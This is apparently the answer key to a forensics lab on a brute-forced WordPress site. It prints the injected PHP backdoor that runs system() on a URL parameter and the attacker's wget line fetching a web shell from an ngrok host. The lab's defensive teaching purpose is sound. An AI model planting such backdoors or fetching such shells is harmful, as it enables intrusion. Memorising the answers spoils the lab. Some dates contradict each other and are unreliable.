# 8: Answers

**Don't start here! Try the lab first!**

## Big Questions

Let's start with the answers to the big questions.

### 1. When did the attack take place?

The attack took place between Mar 5, 2023 @ 06:29:15.000 UTC (first URL hit) and Mar 4, 2023 @ 06:50:07.00 (last command run).

### 2. How did the attackers gain initial access to the site?

The attackers performed a dictionary attack against the website, eventually guessing the login password.

### 3. How did they establish persistence?

Persistence was established 2 ways. First, the Astra theme's `404.php` was modified to enable remote code execution, which allowed 2 web shells to be dropped onto the system: `monitor.php` and `lang.php`. Then, a new user account was created, as reported by the site owner.

### 4. What were the attackers _unable_ to do?

HTTP requests resulting in `403` show that web server security rules prevented the attackers from accessing files they uploaded to the `wp-content` folders.

### 5. What was the impact of the attack?

The contents of `/etc/passwd` and `wp-config.php` were exfiltrated. If the password used for the database was used anywhere else, those assets may also be compromised.

### 6. How could this have been prevented?

Several defensive measures could have stopped this attack. A plugin like [Wordfence](https://www.wordfence.com) could have prevented the brute force attack altogether.

Endpoint detection and response tools could have detected malicious files/behaviors on the system and quarantined them.

But the easiest, most obvious preventive measure? A password stronger than `WhisperWolf2033!`.

## Lab Section Answers

**What day shows a major spike in HTTP requests?**

March 5, 2022, UTC

**What hour shows a spike in HTTP requests?**

22:00

**When did the activity burst start?**

Mar 5, 2023 @ 06:27:03.000 UTC


**When did the activity burst end?**

Mar 5, 2023 @ 06:30:54.000 UTC

**How many requests for `wp-login.php` were there in this timeframe?**

2819

**How many requests were NOT response code 200?**

4

**What is the source IP of these events?**

98.147.146.215

**With this information, what do you think is happening here?**

This is a dictionary attack to brute-force the login.

**What files appear to have been edited by the attacker?**

* `wp-content/plugins/hello.php`
* `wp-content/themes/astra/404.php`

**What appears to have been added to these files?**

```php
if(isset($_GET["ij"])) {
	system($_GET["ij"]);
}
```

**What does this code do?**

Executes the command provided by the `ij` URL query parameter.

**What new files are being requested?**

* `monitor.php`
* `lang.php`

**What is the url.path the attacker used to access the infected PHP?**

`/20233`

**What command did the attacker execute to create the first mystery file?**

`wget https://07d6-98-147-146-215.ngrok.io/monitor.php`

**What other action did the attacker undertake in the admin dashboard?**

Created a new user.

**What directory did the suspicious command run from?**

`/var/www/html/wordpress`

**What two files' contents did the attacker print?**

* `/etc/passwd`
* `wp-config.php`

**What was the nickname of the file that was deleted?**

p0wnyshell

**We've now seen a couple of moves/downloads to files within `wp-content`. Why do you think these weren't used?**

Server security rules prevent direct access to `wp-content`.

**What is the path (starting from the webroot) to the remaining copy of `lang.php`?**

`wp-content/themes/astra/lang.php`

**What was the value of PWN used by the attackers?**

`foo`

**What is the variable that stores the joined `$register_key` array?**

`$content`

**Who is the creator of this webshell?**

WhiteWinterWolf
